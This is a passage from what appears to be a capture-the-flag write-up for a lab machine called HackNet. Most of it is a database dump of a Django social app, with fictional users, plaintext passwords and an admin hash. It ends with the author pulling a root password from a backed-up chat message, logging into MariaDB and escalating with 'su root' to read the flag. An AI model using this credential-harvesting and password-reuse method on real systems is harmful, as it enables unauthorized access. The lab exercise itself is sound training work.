(7,'2024-12-27 17:21:17.031076','Not sure yet. What’s up?',1,5,15),
(8,'2024-12-27 17:21:38.885214','I was thinking we could go hiking. Weather looks perfect.',1,15,5),
(9,'2024-12-27 17:21:54.399481','Sounds fun! Let me check my schedule and get back to you.',1,5,15),
(10,'2024-12-27 17:22:08.019864','Cool. Let me know by Friday, so I can plan accordingly.',1,15,5),
(11,'2024-12-27 17:22:37.655136','I need some advice on buying a new laptop. Any recommendations?',1,24,9),
(12,'2024-12-27 17:22:57.853152','Sure! What’s your budget and primary use?',1,9,24),
(13,'2024-12-27 17:23:16.411365','Around $1,000. Mostly for work and light gaming.',1,24,9),
(14,'2024-12-27 17:23:35.110384','Check out the Dell XPS 13 or the ASUS ROG Zephyrus G14. Both are great options.',1,9,24),
(15,'2024-12-27 17:23:51.799717','Thanks! I’ll look into those.',1,24,9),
(16,'2024-12-27 17:24:14.407907','I’m stuck on level 12 of Mystic Quest. Any tips?',1,13,7),
(17,'2024-12-27 17:24:28.926127','Oh, that level’s tricky. Focus on upgrading your shield first.',1,7,13),
(18,'2024-12-27 17:24:42.848217','Got it. What about the boss fight?',1,13,7),
(19,'2024-12-27 17:24:58.353582','Use ranged attacks and dodge a lot. Timing is key.',1,7,13),
(20,'2024-12-27 17:25:12.656028','Thanks! I’ll give it another shot.',1,13,7),
(26,'2024-12-27 17:33:47.519350','Cool. If anything goes wrong, ping me immediately.',1,18,22),
(27,'2024-12-27 17:34:23.653244','Did you hear about the new coffee shop downtown?',1,23,3),
(28,'2024-12-27 17:34:51.679363','Yeah, I went there last week. The caramel latte is amazing.',1,3,23),
(29,'2024-12-27 17:35:06.719977','I’ll have to try it. Is the place cozy?',1,3,23),
(30,'2024-12-27 17:35:24.313146','Very! Great ambiance and fast Wi-Fi. Perfect for working or relaxing.',1,23,3),
(31,'2024-12-27 17:35:41.999268','Awesome. Thanks for the recommendation!',1,3,23),
(32,'2024-12-27 17:37:11.511414','How’s your project coming along?',1,14,6),
(33,'2024-12-27 17:37:26.256242','Slowly but surely. Still working on the presentation slides.',1,6,14),
(34,'2024-12-27 17:37:40.536775','Need any help? I’ve got some free time today.',1,14,6),
(35,'2024-12-27 17:37:58.090203','That would be great! Could you review my draft?',1,6,14),
(36,'2024-12-27 17:38:10.857903','Sure thing. Send it over.',1,14,6),
(37,'2024-12-29 00:43:02.032982','What’s the best way to cook pasta al dente?',1,19,4),
(38,'2024-12-29 00:43:22.235116','Simple! Boil water, add salt, and cook the pasta 1-2 minutes less than the package says.',1,4,19),
(39,'2024-12-29 00:43:41.270862','Do I need to add oil to the water?',1,19,4),
(40,'2024-12-29 00:44:01.955971','No, just stir occasionally to prevent sticking.',1,4,19),
(41,'2024-12-29 00:44:19.343381','Got it. Thanks for the tip!',0,19,4),
(42,'2024-12-29 00:44:55.904749','I’m thinking of adopting a cat. Any advice?',1,6,17),
(43,'2024-12-29 00:45:30.956924','That’s wonderful! Make sure you’re ready for the commitment.',1,17,6),
(44,'2024-12-29 00:45:46.032343','Any specific breeds you’d recommend?',1,6,17),
(45,'2024-12-29 00:46:06.445022','Depends on your lifestyle. Maine Coons are friendly but require grooming.',1,17,6),
(46,'2024-12-29 00:46:23.445332','Good to know. Thanks!',1,6,17),
(53,'2024-12-29 20:33:54.970669','What’s your favorite book? I’m looking for something new to read.',1,10,1),
(54,'2024-12-29 20:34:14.305319','The Night Circus by Erin Morgenstern. It’s magical and beautifully written.',1,1,10),
(55,'2024-12-29 20:34:28.433742','Sounds intriguing. What’s it about?',1,10,1),
(56,'2024-12-29 20:34:43.792889','A mysterious competition between two magicians set in a magical circus.',1,1,10),
(57,'2024-12-29 20:34:57.309182','Adding it to my list. Thanks!',1,10,1),
(58,'2024-12-29 20:35:49.328134','I can’t decide what to make for dinner tonight. Any suggestions?',1,25,2),
(59,'2024-12-29 20:36:02.744157','How about tacos? They’re easy and customizable.',1,2,25),
(60,'2024-12-29 20:36:17.927734','Good idea! I have some ground beef and veggies in the fridge.',1,25,2),
(61,'2024-12-29 20:36:32.023276','Perfect! Don’t forget the salsa and guac.',1,2,25),
(62,'2024-12-29 20:36:43.988559','Thanks! Dinner sorted.',1,25,2);
/*!40000 ALTER TABLE `SocialNetwork_socialmessage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialuser`
--

DROP TABLE IF EXISTS `SocialNetwork_socialuser`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialuser` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `email` varchar(100) NOT NULL,
  `username` varchar(30) NOT NULL,
  `password` varchar(70) NOT NULL,
  `picture` varchar(100) NOT NULL,
  `about` longtext NOT NULL,
  `contact_requests` int(11) NOT NULL,
  `unread_messages` int(11) NOT NULL,
  `is_public` tinyint(1) NOT NULL,
  `is_hidden` tinyint(1) NOT NULL,
  `two_fa` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialuser`
--

LOCK TABLES `SocialNetwork_socialuser` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialuser` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialuser` VALUES
(1,'cyberghost@darkmail.net','cyberghost','Gh0stH@cker2024','1.jpg','A digital nomad with a knack for uncovering vulnerabilities in the deep web. Passionate about cryptography and secure communications.',0,0,1,0,0),
(2,'hexhunter@ciphermail.com','hexhunter','H3xHunt3r!','2.jpg','A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.',0,0,1,0,0),
(3,'rootbreaker@exploitmail.net','rootbreaker','R00tBr3@ker#','3.jpg','Expert in privilege escalation and bypassing security measures. Always on the lookout for new zero-day vulnerabilities.',0,0,1,0,0),
(4,'zero_day@hushmail.com','zero_day','Zer0D@yH@ck','4.jpg','Focused on discovering zero-day vulnerabilities and creating proof-of-concept exploits. A dark web enthusiast.',0,0,1,0,0),
(5,'cryptoraven@securemail.org','cryptoraven','CrYptoR@ven42','5.jpg','Cryptography expert with a love for breaking and creating secure communication protocols. Always one step ahead in the encryption game.',0,0,1,0,0),
(6,'shadowcaster@darkmail.net','shadowcaster','Sh@d0wC@st!','6.jpg','Specializes in social engineering and OSINT techniques. A master of blending into the digital shadows.',0,0,1,0,0),
(7,'blackhat_wolf@cypherx.com','blackhat_wolf','Bl@ckW0lfH@ck','7.png','A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace behind.',0,0,1,0,0),
(8,'bytebandit@exploitmail.net','bytebandit','Byt3B@nd!t123','8.png','A skilled penetration tester and ethical hacker. Enjoys dismantling security systems and exposing their weaknesses.',0,0,0,0,0),
(9,'glitch@cypherx.com','glitch','Gl1tchH@ckz','9.png','Specializes in glitching and fault injection attacks. Loves causing unexpected behavior in software and hardware.',0,0,1,0,0),
(10,'datadive@darkmail.net','datadive','D@taD1v3r','10.png','A data miner and analyst with a focus on extracting and analyzing large datasets from breached databases.',0,0,1,0,0),
(11,'phreaker@securemail.org','phreaker','Phre@k3rH@ck','11.png','Old-school hacker with roots in phone phreaking. Now enjoys exploiting telecom systems and VoIP networks.',0,0,0,0,0),
(12,'codebreaker@ciphermail.com','codebreaker','C0d3Br3@k!','12.png','A programmer with a talent for writing malicious code and cracking software protections. Loves breaking encryption algorithms.',0,0,0,0,0),
(13,'netninja@hushmail.com','netninja','N3tN1nj@2024','13.png','Network security expert focused on intrusion detection and prevention. Known for slicing through firewalls with ease.',0,0,1,0,0),
(14,'packetpirate@exploitmail.net','packetpirate','P@ck3tP!rat3','14.png','A packet sniffer who loves capturing and analyzing network traffic. Always hunting for sensitive data in the ether.',0,0,1,0,0),
(15,'darkseeker@darkmail.net','darkseeker','D@rkSeek3r#','15.png','A hacker who thrives in the dark web. Specializes in anonymity tools and hidden service exploitation.',0,0,1,0,0),
(16,'shadowmancer@cypherx.com','shadowmancer','Sh@d0wM@ncer','16.png','A master of disguise in the digital world, using cloaking techniques and evasion tactics to remain unseen.',0,0,1,0,0),
(17,'trojanhorse@securemail.org','trojanhorse','Tr0j@nH0rse!','17.jpg','Malware developer with a focus on creating and deploying Trojan horses. Enjoys watching systems crumble from within.',0,0,0,0,0),
(18,'mikey@hacknet.htb','backdoor_bandit','mYd4rks1dEisH3re','18.jpg','Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.',0,0,0,0,1),
(19,'exploit_wizard@hushmail.com','exploit_wizard','Expl01tW!zard','19.jpg','An expert in exploit development and vulnerability research. Loves crafting new ways to break into systems.',0,0,1,0,0),
(20,'stealth_hawk@exploitmail.net','stealth_hawk','St3@lthH@wk','20.jpg','Focuses on stealth operations, avoiding detection while infiltrating systems. A ghost in the machine.',0,0,1,0,0),
(21,'whitehat@darkmail.net','whitehat','Wh!t3H@t2024','21.jpg','An ethical hacker with a mission to improve cybersecurity. Works to protect systems by exposing and patching vulnerabilities.',0,0,1,0,0),
(22,'deepdive@hacknet.htb','deepdive','D33pD!v3r','22.png','Specializes in deep web exploration and data extraction. Always looking for hidden gems in the darkest corners of the web.',0,0,0,0,1),
(23,'virus_viper@securemail.org','virus_viper','V!rusV!p3r2024','23.jpg','A malware creator focused on developing viruses that spread rapidly. Known for unleashing digital plagues.',0,0,1,0,0),
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
(25,'shadowwalker@hushmail.com','shadowwalker','Sh@dowW@lk2024','25.jpg','A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.',0,0,0,0,0);
/*!40000 ALTER TABLE `SocialNetwork_socialuser` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialuser_contacts`
--

DROP TABLE IF EXISTS `SocialNetwork_socialuser_contacts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialuser_contacts` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `from_socialuser_id` bigint(20) NOT NULL,
  `to_socialuser_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `SocialNetwork_socialuser_from_socialuser_id_to_so_d031d178_uniq` (`from_socialuser_id`,`to_socialuser_id`),
  KEY `SocialNetwork_social_to_socialuser_id_8d638620_fk_SocialNet` (`to_socialuser_id`),
  CONSTRAINT `SocialNetwork_social_from_socialuser_id_0253669d_fk_SocialNet` FOREIGN KEY (`from_socialuser_id`) REFERENCES `SocialNetwork_socialuser` (`id`),
  CONSTRAINT `SocialNetwork_social_to_socialuser_id_8d638620_fk_SocialNet` FOREIGN KEY (`to_socialuser_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialuser_contacts`
--

LOCK TABLES `SocialNetwork_socialuser_contacts` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialuser_contacts` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialuser_contacts` VALUES
(1,18,22),
(3,21,25),
(2,22,18),
(4,25,21);
/*!40000 ALTER TABLE `SocialNetwork_socialuser_contacts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group`
--

DROP TABLE IF EXISTS `auth_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_group` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(150) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group`
--

LOCK TABLES `auth_group` WRITE;
/*!40000 ALTER TABLE `auth_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group_permissions`
--

DROP TABLE IF EXISTS `auth_group_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_group_permissions` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `group_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_group_permissions_group_id_permission_id_0cd325b0_uniq` (`group_id`,`permission_id`),
  KEY `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` (`permission_id`),
  CONSTRAINT `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_group_permissions_group_id_b120cbf9_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group_permissions`
--

LOCK TABLES `auth_group_permissions` WRITE;
/*!40000 ALTER TABLE `auth_group_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_permission`
--

DROP TABLE IF EXISTS `auth_permission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_permission` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content_type_id` int(11) NOT NULL,
  `codename` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_permission_content_type_id_codename_01ab375a_uniq` (`content_type_id`,`codename`),
  CONSTRAINT `auth_permission_content_type_id_2f476e4b_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=45 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_permission`
--

LOCK TABLES `auth_permission` WRITE;
/*!40000 ALTER TABLE `auth_permission` DISABLE KEYS */;
INSERT INTO `auth_permission` VALUES
(1,'Can add log entry',1,'add_logentry'),
(2,'Can change log entry',1,'change_logentry'),
(3,'Can delete log entry',1,'delete_logentry'),
(4,'Can view log entry',1,'view_logentry'),
(5,'Can add permission',2,'add_permission'),
(6,'Can change permission',2,'change_permission'),
(7,'Can delete permission',2,'delete_permission'),
(8,'Can view permission',2,'view_permission'),
(9,'Can add group',3,'add_group'),
(10,'Can change group',3,'change_group'),
(11,'Can delete group',3,'delete_group'),
(12,'Can view group',3,'view_group'),
(13,'Can add user',4,'add_user'),
(14,'Can change user',4,'change_user'),
(15,'Can delete user',4,'delete_user'),
(16,'Can view user',4,'view_user'),
(17,'Can add content type',5,'add_contenttype'),
(18,'Can change content type',5,'change_contenttype'),
(19,'Can delete content type',5,'delete_contenttype'),
(20,'Can view content type',5,'view_contenttype'),
(21,'Can add session',6,'add_session'),
(22,'Can change session',6,'change_session'),
(23,'Can delete session',6,'delete_session'),
(24,'Can view session',6,'view_session'),
(25,'Can add social article',7,'add_socialarticle'),
(26,'Can change social article',7,'change_socialarticle'),
(27,'Can delete social article',7,'delete_socialarticle'),
(28,'Can view social article',7,'view_socialarticle'),
(29,'Can add social user',8,'add_socialuser'),
(30,'Can change social user',8,'change_socialuser'),
(31,'Can delete social user',8,'delete_socialuser'),
(32,'Can view social user',8,'view_socialuser'),
(33,'Can add social message',9,'add_socialmessage'),
(34,'Can change social message',9,'change_socialmessage'),
(35,'Can delete social message',9,'delete_socialmessage'),
(36,'Can view social message',9,'view_socialmessage'),
(37,'Can add social comment',10,'add_socialcomment'),
(38,'Can change social comment',10,'change_socialcomment'),
(39,'Can delete social comment',10,'delete_socialcomment'),
(40,'Can view social comment',10,'view_socialcomment'),
(41,'Can add contact request',11,'add_contactrequest'),
(42,'Can change contact request',11,'change_contactrequest'),
(43,'Can delete contact request',11,'delete_contactrequest'),
(44,'Can view contact request',11,'view_contactrequest');
/*!40000 ALTER TABLE `auth_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user`
--

DROP TABLE IF EXISTS `auth_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `password` varchar(128) NOT NULL,
  `last_login` datetime(6) DEFAULT NULL,
  `is_superuser` tinyint(1) NOT NULL,
  `username` varchar(150) NOT NULL,
  `first_name` varchar(150) NOT NULL,
  `last_name` varchar(150) NOT NULL,
  `email` varchar(254) NOT NULL,
  `is_staff` tinyint(1) NOT NULL,
  `is_active` tinyint(1) NOT NULL,
  `date_joined` datetime(6) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user`
--

LOCK TABLES `auth_user` WRITE;
/*!40000 ALTER TABLE `auth_user` DISABLE KEYS */;
INSERT INTO `auth_user` VALUES
(1,'pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ=','2024-12-29 20:36:47.624578',1,'admin','','','',1,1,'2024-08-08 18:17:54.472758');
/*!40000 ALTER TABLE `auth_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_groups`
--

DROP TABLE IF EXISTS `auth_user_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user_groups` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_user_groups_user_id_group_id_94350c0c_uniq` (`user_id`,`group_id`),
  KEY `auth_user_groups_group_id_97559544_fk_auth_group_id` (`group_id`),
  CONSTRAINT `auth_user_groups_group_id_97559544_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`),
  CONSTRAINT `auth_user_groups_user_id_6a12ed8b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_groups`
--

LOCK TABLES `auth_user_groups` WRITE;
/*!40000 ALTER TABLE `auth_user_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_user_permissions`
--

DROP TABLE IF EXISTS `auth_user_user_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user_user_permissions` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_user_user_permissions_user_id_permission_id_14a6b632_uniq` (`user_id`,`permission_id`),
  KEY `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` (`permission_id`),
  CONSTRAINT `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_user_user_permissions_user_id_a95ead1b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_user_permissions`
--

LOCK TABLES `auth_user_user_permissions` WRITE;
/*!40000 ALTER TABLE `auth_user_user_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_user_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_admin_log`
--

DROP TABLE IF EXISTS `django_admin_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_admin_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `action_time` datetime(6) NOT NULL,
  `object_id` longtext DEFAULT NULL,
  `object_repr` varchar(200) NOT NULL,
  `action_flag` smallint(5) unsigned NOT NULL CHECK (`action_flag` >= 0),
  `change_message` longtext NOT NULL,
  `content_type_id` int(11) DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `django_admin_log_content_type_id_c4bce8eb_fk_django_co` (`content_type_id`),
  KEY `django_admin_log_user_id_c564eba6_fk_auth_user_id` (`user_id`),
  CONSTRAINT `django_admin_log_content_type_id_c4bce8eb_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`),
  CONSTRAINT `django_admin_log_user_id_c564eba6_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=146 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_admin_log`
--

LOCK TABLES `django_admin_log` WRITE;
/*!40000 ALTER TABLE `django_admin_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `django_admin_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_content_type`
--

DROP TABLE IF EXISTS `django_content_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_content_type` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_label` varchar(100) NOT NULL,
  `model` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `django_content_type_app_label_model_76bd3d3b_uniq` (`app_label`,`model`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_content_type`
--

LOCK TABLES `django_content_type` WRITE;
/*!40000 ALTER TABLE `django_content_type` DISABLE KEYS */;
INSERT INTO `django_content_type` VALUES
(1,'admin','logentry'),
(3,'auth','group'),
(2,'auth','permission'),
(4,'auth','user'),
(5,'contenttypes','contenttype'),
(6,'sessions','session'),
(11,'SocialNetwork','contactrequest'),
(7,'SocialNetwork','socialarticle'),
(10,'SocialNetwork','socialcomment'),
(9,'SocialNetwork','socialmessage'),
(8,'SocialNetwork','socialuser');
/*!40000 ALTER TABLE `django_content_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_migrations`
--

DROP TABLE IF EXISTS `django_migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_migrations` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `app` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `applied` datetime(6) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_migrations`
--

LOCK TABLES `django_migrations` WRITE;
/*!40000 ALTER TABLE `django_migrations` DISABLE KEYS */;
INSERT INTO `django_migrations` VALUES
(1,'SocialNetwork','0001_initial','2024-08-08 18:16:21.370676'),
(2,'SocialNetwork','0002_auto_20240530_2106','2024-08-08 18:16:21.388073'),
(3,'SocialNetwork','0003_alter_socialarticle_date_alter_socialcomment_date','2024-08-08 18:16:21.410144'),
(4,'contenttypes','0001_initial','2024-08-08 18:16:21.505880'),
(5,'auth','0001_initial','2024-08-08 18:16:22.980849'),
(6,'admin','0001_initial','2024-08-08 18:16:23.614631'),
(7,'admin','0002_logentry_remove_auto_add','2024-08-08 18:16:23.653949'),
(8,'admin','0003_logentry_add_action_flag_choices','2024-08-08 18:16:23.692743'),
(9,'contenttypes','0002_remove_content_type_name','2024-08-08 18:16:23.954952'),
(10,'auth','0002_alter_permission_name_max_length','2024-08-08 18:16:24.050357'),
(11,'auth','0003_alter_user_email_max_length','2024-08-08 18:16:24.105707'),
(12,'auth','0004_alter_user_username_opts','2024-08-08 18:16:24.121570'),
(13,'auth','0005_alter_user_last_login_null','2024-08-08 18:16:24.210331'),
(14,'auth','0006_require_contenttypes_0002','2024-08-08 18:16:24.215210'),
(15,'auth','0007_alter_validators_add_error_messages','2024-08-08 18:16:24.231930'),
(16,'auth','0008_alter_user_username_max_length','2024-08-08 18:16:24.288951'),
(17,'auth','0009_alter_user_last_name_max_length','2024-08-08 18:16:24.349177'),
(18,'auth','0010_alter_group_name_max_length','2024-08-08 18:16:24.404983'),
(19,'auth','0011_update_proxy_permissions','2024-08-08 18:16:24.430036'),
(20,'auth','0012_alter_user_first_name_max_length','2024-08-08 18:16:24.639093'),
(21,'sessions','0001_initial','2024-08-08 18:16:24.755268'),
(22,'SocialNetwork','0004_alter_socialarticle_date_alter_socialcomment_date','2024-08-08 21:07:25.546764');
/*!40000 ALTER TABLE `django_migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_session`
--

DROP TABLE IF EXISTS `django_session`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_session` (
  `session_key` varchar(40) NOT NULL,
  `session_data` longtext NOT NULL,
  `expire_date` datetime(6) NOT NULL,
  PRIMARY KEY (`session_key`),
  KEY `django_session_expire_date_a5c62663` (`expire_date`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_session`
--

LOCK TABLES `django_session` WRITE;
/*!40000 ALTER TABLE `django_session` DISABLE KEYS */;
/*!40000 ALTER TABLE `django_session` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-12-29 15:37:43

```

### Checking the creds

Notice in Backup 2 Social network messages part (where users contact each other):

```text
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(49,'2024-12-29 20:30:14.430878','Just tweaking some schema settings for the new project. Won’t take long, I promise.',1,22,18),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
(51,'2024-12-29 20:30:56.880458','Got it. Thanks a lot! I’ll let you know as soon as I’m finished.',1,22,18),
(52,'2024-12-29 20:31:16.112930','Cool. If anything goes wrong, ping me immediately.',0,18,22);
```

there is a password (`h4ck3rs4re3veRywh3re99`), I will check if there is a local database with user root I can access

```shell
mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 84
Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hacknet            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.006 sec)

MariaDB [(none)]> 

```

it worked!

However, I checked `performance_schema` and `sys` for any leaked credentials but there is nothing so I will simply try this password as the root password, maybe there is password reuse

```shell
su root
Password: 
root@hacknet:/var/www/HackNet/backups# whoami
root
root@hacknet:/var/www/HackNet/backups# cd /root
root@hacknet:~# ls
root.txt
root@hacknet:~# cat root.txt 
b4e324bd2dc0a1a082d320687d6fe813
root@hacknet:~# 

```
